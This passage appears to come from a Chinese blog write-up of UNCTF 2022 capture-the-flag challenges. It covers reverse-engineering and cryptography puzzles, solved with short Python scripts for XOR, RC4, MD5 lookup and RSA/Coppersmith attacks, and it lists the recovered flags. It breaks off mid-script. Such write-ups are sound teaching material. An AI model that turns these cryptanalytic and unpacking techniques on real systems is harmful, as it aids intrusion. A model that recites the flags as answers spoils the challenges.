class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># UNCTF&#123;h3ll0_w_0_r_1_d&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="# Reverse"></a># Reverse</h2><h3 id="whereisyourkey"><a href="#whereisyourkey" class="headerlink" title="whereisyourkey"></a>whereisyourkey</h3><blockquote><p>你能找到属于你的key吗？</p></blockquote><p>简单替换加密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">121</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">97</span>, <span class="number">107</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="keyword">if</span> s[i] == <span class="number">109</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> s[i] &lt;= <span class="number">110</span>:</span><br><span class="line">    s[i] -= <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> s[i] &gt; <span class="number">111</span>:</span><br><span class="line">    s[i] += <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(s))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;yesiamflag&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezzzzre"><a href="#ezzzzre" class="headerlink" title="ezzzzre"></a>ezzzzre</h3><blockquote><p>re签到题</p></blockquote><p>exeinfo发现UPX壳，脱壳后，IDA中分析逻辑，顺着实现得flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="built_in">list</span>(<span class="string">b&#x27;HELLOCTF&#x27;</span>)</span><br><span class="line">out = [<span class="number">2</span>*k-<span class="number">69</span> <span class="keyword">for</span> k <span class="keyword">in</span> s]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(out))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;KESSYAcG&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Sudoku"><a href="#Sudoku" class="headerlink" title="Sudoku"></a>Sudoku</h3><p>数独判定逻辑。直接运行显示的数独是错的，动调获取正确的数独初始数组，找个在线网站解了后填入为：</p><p><code>[8, 5, 2, 4, 9, 1, 6, 7, 3, 1, 9, 6, 7, 3, 8, 2, 5, 4, 4, 3, 7, 5, 6, 2, 9, 1, 8, 5, 2, 8, 1, 4, 6, 3, 9, 7, 3, 7, 4, 9, 2, 5, 8, 6, 1, 9, 6, 1, 3, 8, 7, 4, 2, 5, 2, 1, 9, 8, 5, 4, 7, 3, 6, 7, 4, 3, 6, 1, 9, 5, 8, 2, 6, 8, 5, 2, 7, 3, 1, 4, 9]</code></p><p>依次输入后得到</p><p> <code>Y0u_Ar3_R1ght!Th1s_1s_your_f1aaag!</code></p><p><code>UNCTF&#123;chr(29+vme)chr(15+vme)chr(29+vme)chr(24+vme)chr(39+vme)chr(25+vme)chr(29+vme)chr(20+vme)chr(32+vme)&#125;</code></p><p>其中 <code>vme=50</code>，即flag：<code>UNCTF&#123;OAOJYKOFR&#125;</code>。</p><p>​    </p><h3 id="halo"><a href="#halo" class="headerlink" title="halo"></a>halo</h3><p>exeinfo发现UPX壳，脱壳后，IDA中分析逻辑，为两轮异或，还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">85</span>,  <span class="number">11</span>, <span class="number">104</span>,  <span class="number">12</span>, <span class="number">115</span>,  <span class="number">62</span>,  <span class="number">12</span>,  <span class="number">58</span>,  <span class="number">93</span>,  <span class="number">27</span>, </span><br><span class="line">   <span class="number">33</span>, <span class="number">117</span>,  <span class="number">79</span>,  <span class="number">32</span>,  <span class="number">76</span>, <span class="number">113</span>,  <span class="number">88</span>, <span class="number">123</span>,  <span class="number">89</span>,  <span class="number">44</span>, </span><br><span class="line">    <span class="number">0</span>, <span class="number">119</span>,  <span class="number">88</span>, <span class="number">119</span>,  <span class="number">14</span>, <span class="number">114</span>,  <span class="number">91</span>,  <span class="number">38</span>,  <span class="number">11</span>, <span class="number">112</span>, </span><br><span class="line">   <span class="number">10</span>, <span class="number">119</span>, <span class="number">102</span>, <span class="number">119</span>,  <span class="number">54</span>, <span class="number">118</span>,  <span class="number">55</span>, <span class="number">118</span>,  <span class="number">98</span>, <span class="number">114</span>, </span><br><span class="line">  <span class="number">109</span>,  <span class="number">39</span>,  <span class="number">63</span>, <span class="number">119</span>,  <span class="number">38</span>,  <span class="number">38</span>]</span><br><span class="line"></span><br><span class="line">s = [s[i]^<span class="number">0x33</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s))]</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)-<span class="number">1</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    s[i] ^= s[i-<span class="number">1</span>]^i</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(s))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;f_ag&#123;H41oO0_6bb2920f8b98ae3f1fdb10cced277c2c&#125;-&#x27;</span></span><br><span class="line"><span class="comment"># 修正：flag&#123;H41oO0_6bb2920f8b98ae3f1fdb10cced277c2c&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="HelloRust"><a href="#HelloRust" class="headerlink" title="HelloRust"></a>HelloRust</h3><blockquote><p>快来逆逆这一坨答辩罢</p></blockquote><p>IDA打开，分析代码逻辑，识别为RC4算法，找到密文hex值 <code>876927216FC731261B6C3A749A626EA002811D85E0E2D071F4A3090E</code>，以及key值 <code>UnCtF2022</code>，</p><p>使用Cyberchef得到flag明文：<code>unctf&#123;Ru5t_Rc4_1s_2_e@zy!!!&#125;</code>。</p><p>​    </p><h3 id="ezast"><a href="#ezast" class="headerlink" title="ezast"></a>ezast</h3><blockquote><p>你会ast吗</p></blockquote><p>JavaScript抽象语法树（AST），定位密文 <code>OTYN\\\\a[inE+iEl.hcEo)ivo+g</code>，且中间运算包含异或操作，尝试使用Cyberchef异或爆破，发现在key=0x1a时，得到flag：<code>UNCTF&#123;Ast_1s_v4ry_u3slu1&#125;</code>。</p><p>​    </p><h3 id="HUAQIANG"><a href="#HUAQIANG" class="headerlink" title="HUAQIANG"></a>HUAQIANG</h3><p>深育杯原题 生瓜蛋子，参考<a href="https://mp.weixin.qq.com/s/1V5BEsfdZNRKwWP1mCs8wQ">官方wp</a>，代码逻辑为一个VM，逐位爆破flag每位的可行值，得到满足条件的输入：<code>998bc64bbd919f27f44e5e2750644c</code>。</p><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="# Crypto"></a># Crypto</h2><h3 id="md5-1"><a href="#md5-1" class="headerlink" title="md5-1"></a>md5-1</h3><p>爆破可见字符得到md5表，再依次遍历密文取出相应字符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;&#x27;&#x27;4c614360da93c0a041b22e537de151eb</span></span><br><span class="line"><span class="string">8d9c307cb7f3c4a32822a51922d1ceaa</span></span><br><span class="line"><span class="string">0d61f8370cad1d412f80b84d143e1257</span></span><br><span class="line"><span class="string">b9ece18c950afbfa6b0fdbfa4ff731d3</span></span><br><span class="line"><span class="string">800618943025315f869e4e1f09471012</span></span><br><span class="line"><span class="string">f95b70fdc3088560732a5ac135644506</span></span><br><span class="line"><span class="string">e1671797c52e15f763380b45e841ec32</span></span><br><span class="line"><span class="string">c9f0f895fb98ab9159f51fd0297e236d</span></span><br><span class="line"><span class="string">a87ff679a2f3e71d9181a67b7542122c</span></span><br><span class="line"><span class="string">8fa14cdd754f91cc6554c9e71929cce7</span></span><br><span class="line"><span class="string">e1671797c52e15f763380b45e841ec32</span></span><br><span class="line"><span class="string">8277e0910d750195b448797616e091ad</span></span><br><span class="line"><span class="string">cfcd208495d565ef66e7dff9f98764da</span></span><br><span class="line"><span class="string">c81e728d9d4c2f636f067f89cc14862c</span></span><br><span class="line"><span class="string">c9f0f895fb98ab9159f51fd0297e236d</span></span><br><span class="line"><span class="string">92eb5ffee6ae2fec3ad71c777531578f</span></span><br><span class="line"><span class="string">45c48cce2e2d7fbdea1afc51c7c6ad26</span></span><br><span class="line"><span class="string">cfcd208495d565ef66e7dff9f98764da</span></span><br><span class="line"><span class="string">a87ff679a2f3e71d9181a67b7542122c</span></span><br><span class="line"><span class="string">1679091c5a880faf6fb5e6087eb1b2dc</span></span><br><span class="line"><span class="string">8fa14cdd754f91cc6554c9e71929cce7</span></span><br><span class="line"><span class="string">4a8a08f09d37b73795649038408b5f33</span></span><br><span class="line"><span class="string">cfcd208495d565ef66e7dff9f98764da</span></span><br><span class="line"><span class="string">e1671797c52e15f763380b45e841ec32</span></span><br><span class="line"><span class="string">c9f0f895fb98ab9159f51fd0297e236d</span></span><br><span class="line"><span class="string">8fa14cdd754f91cc6554c9e71929cce7</span></span><br><span class="line"><span class="string">cfcd208495d565ef66e7dff9f98764da</span></span><br><span class="line"><span class="string">c9f0f895fb98ab9159f51fd0297e236d</span></span><br><span class="line"><span class="string">cfcd208495d565ef66e7dff9f98764da</span></span><br><span class="line"><span class="string">e1671797c52e15f763380b45e841ec32</span></span><br><span class="line"><span class="string">45c48cce2e2d7fbdea1afc51c7c6ad26</span></span><br><span class="line"><span class="string">1679091c5a880faf6fb5e6087eb1b2dc</span></span><br><span class="line"><span class="string">e1671797c52e15f763380b45e841ec32</span></span><br><span class="line"><span class="string">8f14e45fceea167a5a36dedd4bea2543</span></span><br><span class="line"><span class="string">c81e728d9d4c2f636f067f89cc14862c</span></span><br><span class="line"><span class="string">c4ca4238a0b923820dcc509a6f75849b</span></span><br><span class="line"><span class="string">c9f0f895fb98ab9159f51fd0297e236d</span></span><br><span class="line"><span class="string">a87ff679a2f3e71d9181a67b7542122c</span></span><br><span class="line"><span class="string">cbb184dd8e05c9709e5dcaedaa0495cf&#x27;&#x27;&#x27;</span>.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>))</span><br><span class="line">t = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">    t[md5(<span class="built_in">chr</span>(k).encode()).hexdigest()] = <span class="built_in">chr</span>(k)</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> c:</span><br><span class="line">    flag += t[k]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># UNCTF&#123;e84fed028b9046fc0e8f080e96e72184&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="dddd"><a href="#dddd" class="headerlink" title="dddd"></a>dddd</h3><p>1换为 <code>.</code>，0换为 <code>-</code>，摩斯密码解密得：<code>UNCTF&#123;Y4S_TH1S_JUST_M0RSE&#125;</code>。</p><p>​    </p><h3 id="caesar"><a href="#caesar" class="headerlink" title="caesar"></a>caesar</h3><p>ROT64变种凯撒密码，用脚本还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;B6vAy&#123;dhd_AOiZ_KiMyLYLUa_JlL/HY_&#125;&#x27;</span></span><br><span class="line">dic = string.ascii_uppercase+string.ascii_lowercase+string.digits+<span class="string">&#x27;+/&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(dic)</span><br><span class="line"></span><br><span class="line">d = <span class="built_in">ord</span>(<span class="string">&#x27;U&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">  <span class="keyword">if</span> s[i] == <span class="string">&#x27;&#123;&#x27;</span> <span class="keyword">or</span> s[i] == <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">or</span> s[i] == <span class="string">&#x27;_&#x27;</span>:</span><br><span class="line">    t += s[i]</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    t += dic[(dic.index(s[i])+d)%<span class="number">64</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"></span><br><span class="line"><span class="comment"># UNCTF&#123;w0w_Th1s_d1fFerent_c4eSar_&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="md5-2"><a href="#md5-2" class="headerlink" title="md5-2"></a>md5-2</h3><p>比md5-1多了一层异或操作，还原即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;&#x27;&#x27;4c614360da93c0a041b22e537de151eb</span></span><br><span class="line"><span class="string">c1fd731c6d60040369908b4a5f309f41</span></span><br><span class="line"><span class="string">80fdc84bbb5ed9e207a21d5436efdcfd</span></span><br><span class="line"><span class="string">b48d19bb99a7e6bb448f63b75bc92384</span></span><br><span class="line"><span class="string">39eaf918a52fcaa5ed9195e546b021c1</span></span><br><span class="line"><span class="string">795d6869f32db43ff5b414de3c235514</span></span><br><span class="line"><span class="string">f59a054403f933c842e9c3235c136367</span></span><br><span class="line"><span class="string">c80b37816048952a3c0fc9780602a2fa</span></span><br><span class="line"><span class="string">810ecef68e945c3fe7d6accba8b329bd</span></span><br><span class="line"><span class="string">cad06891e0c769c7b02c228c8c2c8865</span></span><br><span class="line"><span class="string">470a96d253a639193530a15487fea36f</span></span><br><span class="line"><span class="string">470a96d253a639193530a15487fea36f</span></span><br><span class="line"><span class="string">4bdea6676e5335f857fa8e47249fa1d8</span></span><br><span class="line"><span class="string">810ecef68e945c3fe7d6accba8b329bd</span></span><br><span class="line"><span class="string">edbb7ab78cde98a07b9b5a2ab284bf0a</span></span><br><span class="line"><span class="string">44b43e07e9af05e3b9b129a287e5a8df</span></span><br><span class="line"><span class="string">a641c08ed66b55c9bd541fe1b22ce5c0</span></span><br><span class="line"><span class="string">abed1f675819a2c0f65c9b7da8cab301</span></span><br><span class="line"><span class="string">738c486923803a1b59ef17329d70bbbd</span></span><br><span class="line"><span class="string">7e209780adf2cd1212e793ae8796ed7c</span></span><br><span class="line"><span class="string">a641c08ed66b55c9bd541fe1b22ce5c0</span></span><br><span class="line"><span class="string">a641c08ed66b55c9bd541fe1b22ce5c0</span></span><br><span class="line"><span class="string">636a84a33e1373324d64463eeb8e7614</span></span><br><span class="line"><span class="string">6ec65b4ab061843b066cc2a2f16820d5</span></span><br><span class="line"><span class="string">a4a39b59eb036a4a8922f7142f874114</span></span><br><span class="line"><span class="string">8c34745bd5b5d42cb3efe381eeb88e4b</span></span><br><span class="line"><span class="string">5b1ba76b1d36847d632203a75c4f74e2</span></span><br><span class="line"><span class="string">d861570e7b9998dbafb38c4f35ba08bc</span></span><br><span class="line"><span class="string">464b7d495dc6019fa4a709da29fc7952</span></span><br><span class="line"><span class="string">8eb69528cd84b73d858be0947f97b7cc</span></span><br><span class="line"><span class="string">dd6ac4c783a9059d11cb0910fc95d4a</span></span><br><span class="line"><span class="string">4b6b0ee5d5f6b24e6898997d765c487c</span></span><br><span class="line"><span class="string">b0762bc356c466d6b2b8f6396f2e041</span></span><br><span class="line"><span class="string">8547287408e2d2d8f3834fc1b90c3be9</span></span><br><span class="line"><span class="string">82947a7d007b9854fa62efb18c9fd91f</span></span><br><span class="line"><span class="string">8ddafe43b36150de851c83d80bd22b0a</span></span><br><span class="line"><span class="string">c7b36c5f23587e285e528527d1263c8b</span></span><br><span class="line"><span class="string">2a0816e8af86e68825c9df0d63a28381</span></span><br><span class="line"><span class="string">63ce72a42cf62e6d0fdc6c96df4687e3&#x27;&#x27;&#x27;</span>.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cc = [<span class="built_in">int</span>(k,<span class="number">16</span>) <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(cc)):</span><br><span class="line">    cc[i] ^= cc[i-<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">cc = [<span class="built_in">hex</span>(k)[<span class="number">2</span>:].rjust(<span class="number">32</span>,<span class="string">&#x27;0&#x27;</span>) <span class="keyword">for</span> k <span class="keyword">in</span> cc]</span><br><span class="line"><span class="built_in">print</span>(cc)</span><br><span class="line"></span><br><span class="line">s=<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>))</span><br><span class="line">t=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">    t[md5(<span class="built_in">chr</span>(k).encode()).hexdigest()]=<span class="built_in">chr</span>(k)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> cc:</span><br><span class="line">    flag += t[k]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># UNCTF&#123;a197271943ceb3c3fe98bcadf10c29d4&#125; </span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h3><p>常规RSA。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">62927872600012424750752897921698090776534304875632744929068546073325488283530025400224435562694273281157865037525456502678901681910303434689364320018805568710613581859910858077737519009451023667409223317546843268613019139524821964086036781112269486089069810631981766346242114671167202613483097500263981460561</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">56959646997081238078544634686875547709710666590620774134883288258992627876759606112717080946141796037573409168410595417635905762691247827322319628226051756406843950023290877673732151483843276348210800329658896558968868729658727981445607937645264850938932045242425625625685274204668013600475330284378427177504</span></span><br><span class="line">p = gmpy2.iroot(n,<span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line">f = p**<span class="number">3</span>*(p-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;unctf&#123;pneum0n0ultram01cr0sc0p01cs01l01c0v0lcan0c0n010s01s&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Single-table"><a href="#Single-table" class="headerlink" title="Single table"></a>Single table</h3><p>读加密方式，明显的playfair密码。</p><p>按照key排列好字母表，手动把每两个字母取出解密后，排列为 <code>UNCTFGODYOUKNOWPLAYFAIRX</code>，在适当的地方加符号分割单词：<code>UNCTF&#123;GOD_YOU_KNOW_PLAYFAIR&#125;</code>。</p><p>​    </p><h3 id="Multi-table"><a href="#Multi-table" class="headerlink" title="Multi table"></a>Multi table</h3><p>变表维吉尼亚密码，先根据前4字符确定key值，再遍历爆破。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_uppercase</span><br><span class="line"></span><br><span class="line">base_table = [<span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;B&#x27;</span>]</span><br><span class="line"></span><br><span class="line">table=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">  table[i]=ascii_uppercase[i:]+ascii_uppercase[:i]</span><br><span class="line"></span><br><span class="line">ori = <span class="string">&#x27;UNCT&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;SDCG&#x27;</span></span><br><span class="line">key = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">  <span class="keyword">for</span> k,v <span class="keyword">in</span> table.items():</span><br><span class="line">    <span class="keyword">if</span> v[base_table.index(ori[i])] == res[i]:</span><br><span class="line">      key.append(k)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;SDCGW&#123;MPN_VHG_AXHU_GERA_SM_EZJNDBWN_UZHETD&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">  <span class="keyword">if</span> c[i] <span class="keyword">in</span> ascii_uppercase:</span><br><span class="line">    now = table[key[x%<span class="number">4</span>]].index(c[i]) </span><br><span class="line">    flag += base_table[now]</span><br><span class="line">    x += <span class="number">1</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    flag += c[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [9, 15, 23, 16]</span></span><br><span class="line"><span class="comment"># UNCTF&#123;WOW_YOU_KNOW_THIS_IS_VIGENERE_CIPHER&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h3><p>泄露 $m$ 高位的Coppersmith攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">25300208242652033869357280793502260197802939233346996226883788604545558438230715925485481688339916461848731740856670110424196191302689278983802917678262166845981990182434653654812540700781253868833088711482330886156960638711299829638134615325986782943291329606045839979194068955235982564452293191151071585886524229637518411736363501546694935414687215258794960353854781449161486836502248831218800242916663993123670693362478526606712579426928338181399677807135748947635964798646637084128123883297026488246883131504115767135194084734055003319452874635426942328780711915045004051281014237034453559205703278666394594859431</span></span><br><span class="line">c = <span class="number">15389131311613415508844800295995106612022857692638905315980807050073537858857382728502142593301948048526944852089897832340601736781274204934578234672687680891154129252310634024554953799372265540740024915758647812906647109145094613323994058214703558717685930611371268247121960817195616837374076510986260112469914106674815925870074479182677673812235207989739299394932338770220225876070379594440075936962171457771508488819923640530653348409795232033076502186643651814610524674332768511598378284643889355772457510928898105838034556943949348749710675195450422905795881113409243269822988828033666560697512875266617885514107</span></span><br><span class="line">e =  <span class="number">6</span> </span><br><span class="line">mbar = <span class="number">11941439146252171444944646015445273361862078914338385912062672317789429687879409370001983412365416202240</span></span><br><span class="line">kbits = <span 